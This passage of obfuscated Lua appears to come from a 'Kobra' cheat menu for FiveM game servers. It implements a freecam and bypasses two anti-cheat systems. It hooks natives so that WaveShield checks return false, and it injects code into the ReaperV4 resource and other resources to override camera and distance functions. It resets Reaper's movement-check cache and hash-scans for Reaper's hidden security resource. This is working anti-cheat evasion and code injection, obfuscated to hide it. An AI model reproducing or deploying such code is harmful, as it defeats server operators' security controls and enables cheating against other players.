((v158.type=="scrollable") or (v158.type=="scrollable-checkbox")) then local v479=794 -(413 + 381) ;while true do if (0==v479) then if (v158.values and (type(v158.values)=="table") and ( #v158.values>(0 + 0))) then if v158.onSelect then v158.onSelect(v158.values[v158.value]);end end return;end end end if ((v158.type=="slider") or (v158.type=="slider-checkbox")) then local v480=0;while true do if (v480==(0 -0)) then if ((v158.scrollType=="onEnter") and v158.onSelect) then if (v158.type=="slider-checkbox") then v158.onSelect(v158.value,v158.checked or false );else v158.onSelect(v158.value);end end return;end end end end;local v51=false;v0.Backspace=function(v159) if ( #v8>(0 -0)) then local v481=1970 -(582 + 1388) ;local v482;while true do if (v481==(1 -0)) then v5=v482.menu or v4 ;v6=v482.categories;v481=2;end if (v481==(3 + 0)) then v159:UpdateElements(v5);break;end if (v481==(364 -(326 + 38))) then v482=table.remove(v8);table.remove(v9);v481=2 -1 ;end if (v481==2) then v7=v482.categoryIndex or (1 -0) ;v3=621 -(47 + 573) ;v481=3;end end else v159:HideUI();end end;v0.PrevCategory=function(v160) local v161=0 + 0 ;while true do if (v161==(0 -0)) then if ( not v6 or ( #v6==(0 -0))) then return;end v7=v7-(1665 -(1269 + 395)) ;v161=1;end if ((494 -(76 + 416))==v161) then v3=1;v160:UpdateElements(v5);v161=446 -(319 + 124) ;end if (v161==(2 -1)) then if (v7<(1008 -(564 + 443))) then v7= #v6;end v5=v6[v7].tabs or {} ;v161=5 -3 ;end if ((461 -(337 + 121))==v161) then v160:SendMessage({action="keydown",index=v3-(2 -1) });break;end end end;v0.NextCategory=function(v162) local v163=0 -0 ;while true do if (v163==(1914 -(1261 + 650))) then v162:SendMessage({action="keydown",index=v3-(1 + 0) });break;end if (0==v163) then if ( not v6 or ( #v6==0)) then return;end v7=v7 + 1 ;v163=1 -0 ;end if (v163==1) then if (v7> #v6) then v7=1818 -(772 + 1045) ;end v5=v6[v7].tabs or {} ;v163=1 + 1 ;end if (v163==2) then v3=145 -(102 + 42) ;v162:UpdateElements(v5);v163=1847 -(1524 + 320) ;end end end;v0.ToggleFreecam=function(v164,v165,v166) if (type(v165)~="boolean") then return;end if v165 then local v483=0;while true do if (v483==(1270 -(1049 + 221))) then v20=true;MachoSendDuiMessage(v2,json.encode({action="displayFreecam",visible=true,weaponIndex=v22,vehicleIndex=v23}));v483=157 -(18 + 138) ;end if (v483==(2 -1)) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000 -(67 + 1035) ,function(...) return false, -(349 -(136 + 212));end);MachoHookNative(11673589000000000000 -0 ,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -(66 + 736) ,function(...) return false,false;end);MachoHookNative(10181871000000000000,function(...) return false,1604 -(240 + 1364) ;end);MachoHookNative(12777102000000000000,function(...) return false,false;end);MachoHookNative(1858573000000000000 -(1050 + 32) ,function(...) return false,0 -0 ;end);MachoHookNative(15349248000000000000 -(331 + 724) ,function(...) return false,0;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);MachoHookNative(11059360000000000000,function(...) return false,true;end);_G.KobraFreecamSpeed=v166;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1117,v1118) local v1119=0 + 0 ;local v1120;while true do if (v1119==(644 -(269 + 375))) then v1120=_G[v1117];if ( not v1120 or (type(v1120)~="function")) then return;end v1119=726 -(267 + 458) ;end if (v1119==(1 + 0)) then _G[v1117]=function(...) return v1118(v1120,...);end;break;end end end local function v1078(v1121) local v1122=0 -0 ;local v1123;local v1124;local v1125;while true do if (v1122==(819 -(667 + 151))) then v1125=math.abs(math.cos(v1124));return vector3( -math.sin(v1123) * v1125 ,math.cos(v1123) * v1125 ,math.sin(v1124));end if (v1122==(1497 -(1410 + 87))) then v1123=math.rad(v1121.z);v1124=math.rad(v1121.x);v1122=1;end end end local function v1079(v1126) local v1127=1897 -(1504 + 393) ;local v1128;while true do if (v1127==(0 -0)) then v1128=math.rad(v1126.z);return vector3(math.cos(v1128),math.sin(v1128),0);end end end local function v1080(v1129,v1130,v1131) local v1132=0 -0 ;while true do if ((796 -(461 + 335))==v1132) then if (v1129<v1130) then return v1130;end if (v1129>v1131) then return v1131;end v1132=1;end if (v1132==1) then return v1129;end end end hNative("RotationToDirection",function(v1133,...) return v1133(...);end);hNative("GetRightVector",function(v1134,...) return v1134(...);end);hNative("Clamp",function(v1135,...) return v1135(...);end);hNative("CreateThread",function(v1136,...) return v1136(...);end);hNative("Wait",function(v1137,...) return v1137(...);end);hNative("IsVehicleSeatFree",function(v1138,...) return v1138(...);end);hNative("PlayerPedId",function(v1139,...) return v1139(...);end);hNative("GetEntityCoords",function(v1140,...) return v1140(...);end);hNative("CreateCam",function(v1141,...) return v1141(...);end);hNative("DoesCamExist",function(v1142,...) return v1142(...);end);hNative("SetCamCoord",function(v1143,...) return v1143(...);end);hNative("SetCamRot",function(v1144,...) return v1144(...);end);hNative("RenderScriptCams",function(v1145,...) return v1145(...);end);hNative("DestroyCam",function(v1146,...) return v1146(...);end);hNative("SetFocusEntity",function(v1147,...) return v1147(...);end);hNative("SetTextFont",function(v1148,...) return v1148(...);end);hNative("SetTextProportional",function(v1149,...) return v1149(...);end);hNative("SetTextScale",function(v1150,...) return v1150(...);end);hNative("SetTextDropShadow",function(v1151,...) return v1151(...);end);hNative("SetTextEdge",function(v1152,...) return v1152(...);end);hNative("SetTextOutline",function(v1153,...) return v1153(...);end);hNative("SetTextCentre",function(v1154,...) return v1154(...);end);hNative("SetTextColour",function(v1155,...) return v1155(...);end);hNative("BeginTextCommandDisplayText",function(v1156,...) return v1156(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1157,...) return v1157(...);end);hNative("EndTextCommandDisplayText",function(v1158,...) return v1158(...);end);hNative("GetCamCoord",function(v1159,...) return v1159(...);end);hNative("GetCamRot",function(v1160,...) return v1160(...);end);hNative("IsControlPressed",function(v1161,...) return v1161(...);end);hNative("GetDisabledControlNormal",function(v1162,...) return v1162(...);end);hNative("TaskStandStill",function(v1163,...) return v1163(...);end);hNative("SetFocusPosAndVel",function(v1164,...) return v1164(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1165,...) return v1165(...);end);hNative("GetShapeTestResult",function(v1166,...) return v1166(...);end);hNative("IsControlJustPressed",function(v1167,...) return v1167(...);end);hNative("IsDisabledControlJustPressed",function(v1168,...) return v1168(...);end);hNative("IsEntityAVehicle",function(v1169,...) return v1169(...);end);hNative("TaskWarpPedIntoVehicle",function(v1170,...) return v1170(...);end);hNative("SetEntityCoords",function(v1171,...) return v1171(...);end);hNative("GiveWeaponToPed",function(v1172,...) return v1172(...);end);hNative("SetCurrentPedWeapon",function(v1173,...) return v1173(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1174,...) return v1174(...);end);local v1081=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1081.x,v1081.y,v1081.z + 1 + 1 );SetCamRot(_G.KobraFreecamObject,1761 -(1730 + 31) ,1667 -(728 + 939) ,GetEntityHeading(PlayerPedId()),2);RenderScriptCams(true,false,0 -0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 -0 );if _G.KobraFreecamObject then local v1311=0;local v1312;local v1313;local v1314;local v1315;local v1316;local v1317;local v1318;local v1319;local v1320;local v1321;local v1322;local v1323;local v1324;while true do if (v1311==(2 -1)) then v1316=v1078(v1313);v1317=v1079(v1313);v1318,v1319,v1320=1068 -(138 + 930) ,0 + 0 ,0;TaskStandStill(PlayerPedId(),10);v1311=2 + 0 ;end if (v1311==(0 + 0)) then v1312=GetCamCoord(_G.KobraFreecamObject);v1313=GetCamRot(_G.KobraFreecamObject,8 -6 );v1314=_G.KobraFreecamSpeed or (1766.25 -(459 + 1307)) ;v1315=(IsControlPressed(1870 -(474 + 1396) ,36 -15 ) and (v1314 + 1)) or v1314 ;v1311=1 + 0 ;end if (v1311==5) then SetCamRot(_G.KobraFreecamObject,v1323,v1313.y,v1324,1 + 1 );break;end if (4==v1311) then v1321=GetDisabledControlNormal(0 -0 ,1 + 0 );v1322=GetDisabledControlNormal(0 -0 ,2);v1323=v1080(v1313.x-(v1322 * 5) , -(388 -299),680 -(562 + 29) );v1324=v1313.z-(v1321 * 5) ;v1311=5 + 0 ;end if (v1311==(1422 -(374 + 1045))) then if IsControlPressed(0,28 + 7 ) then local v1573=0 -0 ;while true do if (0==v1573) then v1318=v1318 + (v1317.x * v1315) ;v1319=v1319 + (v1317.y * v1315) ;break;end end end if IsControlPressed(638 -(448 + 190) ,8 + 14 ) then v1320=v1320 + v1315 ;end if IsControlPressed(0 + 0 ,36) then v1320=v1320-v1315 ;end SetCamCoord(_G.KobraFreecamObject,v1312.x + v1318 ,v1312.y + v1319 ,v1312.z + v1320 );v1311=3 + 1 ;end if (v1311==2) then SetFocusPosAndVel(v1312.x,v1312.y,v1312.z,0,0 -0 ,0);if IsControlPressed(0,99 -67 ) then local v1574=1494 -(1307 + 187) ;while true do if (v1574==0) then v1318=v1318 + (v1316.x * v1315) ;v1319=v1319 + (v1316.y * v1315) ;v1574=3 -2 ;end if (v1574==(2 -1)) then v1320=v1320 + (v1316.z * v1315) ;break;end end end if IsControlPressed(0 -0 ,33) then local v1575=683 -(232 + 451) ;while true do if (v1575==(0 + 0)) then v1318=v1318-(v1316.x * v1315) ;v1319=v1319-(v1316.y * v1315) ;v1575=1;end if (v1575==(1 + 0)) then v1320=v1320-(v1316.z * v1315) ;break;end end end if IsControlPressed(564 -(510 + 54) ,34) then v1318=v1318-(v1317.x * v1315) ;v1319=v1319-(v1317.y * v1315) ;end v1311=5 -2 ;end end end end end);else _G.KobraFreecamEnabled=true;end else v36(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v166   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v18 then local v987=0;local v988;local v989;while true do if (v987==(38 -(13 + 23))) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(487 -237 );v987=3;end if (v987==(3 -0)) then if v989 then MachoInjectResource(v989,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v987=7 -3 ;end if ((1088 -(830 + 258))==v987) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v988=nil;v987=3 -2 ;end if (v987==(3 + 1)) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v18=true;break;end if (v987==(1 + 0)) then function v988() local v1183=1441 -(860 + 581) ;local v1184;local v1185;local v1186;local v1187;local v1188;local v1189;local v1190;local v1191;while true do if (v1183==(3 -2)) then v1187=tonumber(v1186);if  not v1187 then return;end v1188=GetNumResources() or (0 + 0) ;v1189={};v1183=243 -(237 + 4) ;end if (v1183==(0 -0)) then v1184=false;v1185=nil;function v1185(v1418,v1419) local v1420=0 -0 ;local v1421;while true do if (v1420==(0 -0)) then v1419=v1419 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1418=v1418   .. v1419 ;v1420=1 + 0 ;end if (v1420==1) then v1421=5381;for v1608=1 + 0 , #v1418 do local v1609=string.byte(v1418,v1608);v1421=(v1421 * (124 -91))~v1609 ;end v1420=1 + 1 ;end if (v1420==2) then return v1421;end end end v1186=GetConvar("reaper_security_resource","");v1183=1 + 0 ;end if (v1183==(1429 -(85 + 1341))) then for v1422,v1423 in ipairs(v1189) do v1190=v1190 + (1 -0) ;if (v1185(v1423)==v1187) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1423 );v1191=v1423;break;end local v1424=v1423:gsub("[-_]","");if ((v1424~=v1423) and (v1185(v1424)==v1187)) then v1191=v1424;break;end if ((v1190%(141 -91))==0) then Wait(372 -(45 + 327) );end end if v1191 then return v1191;end break;end if (v1183==(3 -1)) then for v1425=502 -(444 + 58) ,v1188-(1 + 0)  do local v1426=0 + 0 ;local v1427;while true do if (0==v1426) then v1427=GetResourceByFindIndex(v1425);if (v1427 and (v1427~="")) then table.insert(v1189,v1427);end break;end end end if ( #v1189==(0 + 0)) then return;end v1190=0;v1191=nil;v1183=3;end end end v989=v988();v987=2;end end end _G.KobraFreecamSpeed=v166;if  not _G.KobraFreecamThreadRunning then local v990=0 -0 ;local v991;local v992;local v993;local v994;while true do if (v990==(1739 -(64 + 1668))) then hNative("SetTextEdge",function(v1192,...) return v1192(...);end);hNative("SetTextOutline",function(v1193,...) return v1193(...);end);hNative("SetTextCentre",function(v1194,...) return v1194(...);end);hNative("SetTextColour",function(v1195,...) return v1195(...);end);v990=8;end if (v990==(1987 -(1227 + 746))) then CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 -0 );if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1363=0 -0 ;local v1364;local v1365;local v1366;local v1367;local v1368;local v1369;local v1370;local v1371;local v1372;local v1373;local v1374;local v1375;local v1376;while true do if (v1363==(494 -(415 + 79))) then v1364=GetCamCoord(_G.KobraFreecamObject);v1365=GetCamRot(_G.KobraFreecamObject,2);v1366=_G.KobraFreecamSpeed or (0.25 + 0) ;v1367=(IsControlPressed(491 -(142 + 349) ,9 + 12 ) and (v1366 + 1)) or v1366 ;v1363=1 -0 ;end if (v1363==3) then if IsControlPressed(0,18 + 17 ) then local v1610=0;while true do if (v1610==(0 + 0)) then v1370=v1370 + (v1369.x * v1367) ;v1371=v1371 + (v1369.y * v1367) ;break;end end end if IsControlPressed(0 -0 ,22) then v1372=v1372 + v1367 ;end if IsControlPressed(1864 -(1710 + 154) ,354 -(200 + 118) ) then v1372=v1372-v1367 ;end SetCamCoord(_G.KobraFreecamObject,v1364.x + v1370 ,v1364.y + v1371 ,v1364.z + v1372 );v1363=2 + 2 ;end if (v1363==(6 -2)) then v1373=GetDisabledControlNormal(0 -0 ,1 + 0 );v1374=GetDisabledControlNormal(0,2 + 0 );v1375=v993(v1365.x-(v1374 * (3 + 2)) , -89,15 + 74 );v1376=v1365.z-(v1373 * 5) ;v1363=5;end if ((10 -5)==v1363) then SetCamRot(_G.KobraFreecamObject,v1375,v1365.y,v1376,1252 -(363 + 887) );break;end if (v1363==1) then v1368=v991(v1365);v1369=v992(v1365);v1370,v1371,v1372=0 -0 ,0 -0 ,0 + 0 ;TaskStandStill(PlayerPedId(),23 -13 );v1363=2;end if ((2 + 0)==v1363) then SetFocusPosAndVel(v1364.x,v1364.y,v1364.z,1664 -(674 + 990) ,0 + 0 ,0 + 0 );if IsControlPressed(0 -0 ,1087 -(507 + 548) ) then v1370=v1370 + (v1368.x * v1367) ;v1371=v1371 + (v1368.y * v1367) ;v1372=v1372 + (v1368.z * v1367) ;end if IsControlPressed(837 -(289 + 548) ,1851 -(821 + 997) ) then local v1611=255 -(195 + 60) ;while true do if ((0 + 0)==v1611) then v1370=v1370-(v1368.x * v1367) ;v1371=v1371-(v1368.y * v1367) ;v1611=1502 -(251 + 1250) ;end if (v1611==(2 -1)) then v1372=v1372-(v1368.z * v1367) ;break;end end end if IsControlPressed(0 + 0 ,1066 -(809 + 223) ) then local v1612=0 -0 ;while true do if (v1612==0) then v1370=v1370-(v1369.x * v1367) ;v1371=v1371-(v1369.y * v1367) ;break;end end end v1363=8 -5 ;end end end end end);break;end if (v990==(16 -11)) then hNative("SetCamRot",function(v1196,...) return v1196(...);end);hNative("RenderScriptCams",function(v1197,...) return v1197(...);end);hNative("DestroyCam",function(v1198,...) return v1198(...);end);hNative("SetFocusEntity",function(v1199,...) return v1199(...);end);v990=5 + 1 ;end if (v990==(2 + 1)) then hNative("CreateThread",function(v1200,...) return v1200(...);end);hNative("Wait",function(v1201,...) return v1201(...);end);hNative("IsVehicleSeatFree",function(v1202,...) return v1202(...);end);hNative("PlayerPedId",function(v1203,...) return v1203(...);end);v990=621 -(14 + 603) ;end if ((141 -(118 + 11))==v990) then hNative("GiveWeaponToPed",function(v1204,...) return v1204(...);end);hNative("SetCurrentPedWeapon",function(v1205,...) return v1205(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1206,...) return v1206(...);end);v994=GetEntityCoords(PlayerPedId());v990=3 + 10 ;end if (v990==11) then hNative("IsDisabledControlJustPressed",function(v1207,...) return v1207(...);end);hNative("IsEntityAVehicle",function(v1208,...) return v1208(...);end);hNative("TaskWarpPedIntoVehicle",function(v1209,...) return v1209(...);end);hNative("SetEntityCoords",function(v1210,...) return v1210(...);end);v990=10 + 2 ;end if (v990==9) then hNative("GetCamRot",function(v1211,...) return v1211(...);end);hNative("IsControlPressed",function(v1212,...) return v1212(...);end);hNative("GetDisabledControlNormal",function(v1213,...) return v1213(...);end);hNative("TaskStandStill",function(v1214,...) return v1214(...);end);v990=29 -19 ;end if (v990==(953 -(551 + 398))) then hNative("GetEntityCoords",function(v1215,...) return v1215(...);end);hNative("CreateCam",function(v1216,...) return v1216(...);end);hNative("DoesCamExist",function(v1217,...) return v1217(...);end);hNative("SetCamCoord",function(v1218,...) return v1218(...);end);v990=4 + 1 ;end if ((3 + 3)==v990) then hNative("SetTextFont",function(v1219,...) return v1219(...);end);hNative("SetTextProportional",function(v1220,...) return v1220(...);end);hNative("SetTextScale",function(v1221,...) return v1221(...);end);hNative("SetTextDropShadow",function(v1222,...) return v1222(...);end);v990=7;end if (1==v990) then function v991(v1223) local v1224=0;local v1225;local v1226;local v1227;while true do if ((0 + 0)==v1224) then v1225=math.rad(v1223.z);v1226=math.rad(v1223.x);v1224=3 -2 ;end if (v1224==(2 -1)) then v1227=math.abs(math.cos(v1226));return vector3( -math.sin(v1225) * v1227 ,math.cos(v1225) * v1227 ,math.sin(v1226));end end end v992=nil;function v992(v1228) local v1229=0 + 0 ;local v1230;while true do if (v1229==(0 -0)) then v1230=math.rad(v1228.z);return vector3(math.cos(v1230),math.sin(v1230),0 + 0 );end end end v993=nil;v990=2;end if (v990==(99 -(40 + 49))) then hNative("SetFocusPosAndVel",function(v1231,...) return v1231(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1232,...) return v1232(...);end);hNative("GetShapeTestResult",function(v1233,...) return v1233(...);end);hNative("IsControlJustPressed",function(v1234,...) return v1234(...);end);v990=11;end if ((49 -36)==v990) then _G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v994.x,v994.y,v994.z + (492 -(99 + 391)) );SetCamRot(_G.KobraFreecamObject,0,0 + 0 ,GetEntityHeading(PlayerPedId()),8 -6 );RenderScriptCams(true,false,0 -0 ,true,true);v990=14 + 0 ;end if ((5 -3)==v990) then function v993(v1235,v1236,v1237) local v1238=0;while true do if (v1238==0) then if (v1235<v1236) then return v1236;end if (v1235>v1237) then return v1237;end v1238=1605 -(1032 + 572) ;end if (v1238==1) then return v1235;end end end hNative("RotationToDirection",function(v1239,...) return v1239(...);end);hNative("GetRightVector",function(v1240,...) return v1240(...);end);hNative("Clamp",function(v1241,...) return v1241(...);end);v990=420 -(203 + 214) ;end if (v990==8) then hNative("BeginTextCommandDisplayText",function(v1242,...) return v1242(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1243,...) return v1243(...);end);hNative("EndTextCommandDisplayText",function(v1244,...) return v1244(...);end);hNative("GetCamCoord",function(v1245,...) return v1245(...);end);v990=1826 -(568 + 1249) ;end if (v990==(0 + 0)) then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1246,v1247) local v1248=_G[v1246];if ( not v1248 or (type(v1248)~="function")) then return;end _G[v1246]=function(...) return v1247(v1248,...);end;end v991=nil;v990=1;end end else _G.KobraFreecamEnabled=true;end end break;end end else local v484=0;while true do if (v484==(0 -0)) then v20=false;MachoSendDuiMessage(v2,json.encode({action="displayFreecam",visible=false}));v484=3 -2 ;end if (v484==(1307 -(913 + 393))) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1014,v1015) local v1016=0;local v1017;while true do if (v1016==(2 -1)) then _G[v1014]=function(...) return v1015(v1017,...);end;break;end if (v1016==0) then v1017=_G[v1014];if ( not v1017 or (type(v1017)~="function")) then return;end v1016=1 -0 ;end end end hNative("CreateThread",function(v1018,...) return v1018(...);end);hNative("Wait",function(v1019,...) return v1019(...);end);hNative("IsVehicleSeatFree",function(v1020,...) return v1020(...);end);hNative("PlayerPedId",function(v1021,...) return v1021(...);end);hNative("GetEntityCoords",function(v1022,...) return v1022(...);end);hNative("CreateCam",function(v1023,...) return v1023(...);end);hNative("SetCamCoord",function(v1024,...) return v1024(...);end);hNative("SetCamRot",function(v1025,...) return v1025(...);end);hNative("RenderScriptCams",function(v1026,...) return v1026(...);end);hNative("DestroyCam",function(v1027,...) return v1027(...);end);hNative("SetFocusEntity",function(v1028,...) return v1028(...);end);hNative("SetTextFont",function(v1029,...) return v1029(...);end);hNative("SetTextProportional",function(v1030,...) return v1030(...);end);hNative("SetTextScale",function(v1031,...) return v1031(...);end);hNative("SetTextDropShadow",function(v1032,...) return v1032(...);end);hNative("SetTextEdge",function(v1033,...) return v1033(...);end);hNative("SetTextOutline",function(v1034,...) return v1034(...);end);hNative("SetTextCentre",function(v1035,...) return v1035(...);end);hNative("SetTextColour",function(v1036,...) return v1036(...);end);hNative("BeginTextCommandDisplayText",function(v1037,...) return v1037(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1038,...) return v1038(...);end);hNative("EndTextCommandDisplayText",function(v1039,...) return v1039(...);end);hNative("GetCamCoord",function(v1040,...) return v1040(...);end);hNative("GetCamRot",function(v1041,...) return v1041(...);end);hNative("IsControlPressed",function(v1042,...) return v1042(...);end);hNative("GetDisabledControlNormal",function(v1043,...) return v1043(...);end);hNative("TaskStandStill",function(v1044,...) return v1044(...);end);hNative("SetFocusPosAndVel",function(v1045,...) return v1045(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1046,...) return v1046(...);end);hNative("GetShapeTestResult",function(v1047,...) return v1047(...);end);hNative("IsControlJustPressed",function(v1048,...) return v1048(...);end);hNative("IsDisabledControlJustPressed",function(v1049,...) return v1049(...);end);hNative("IsEntityAVehicle",function(v1050,...) return v1050(...);end);hNative("TaskWarpPedIntoVehicle",function(v1051,...) return v1051(...);end);hNative("SetEntityCoords",function(v1052,...) return v1052(...);end);hNative("GiveWeaponToPed",function(v1053,...) return v1053(...);end);hNative("SetCurrentPedWeapon",function(v1054,...) return v1054(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1055,...) return v1055(...);end);RenderScriptCams(false,false,410 -(269 + 141) ,true,true);if _G.KobraFreecamObject then 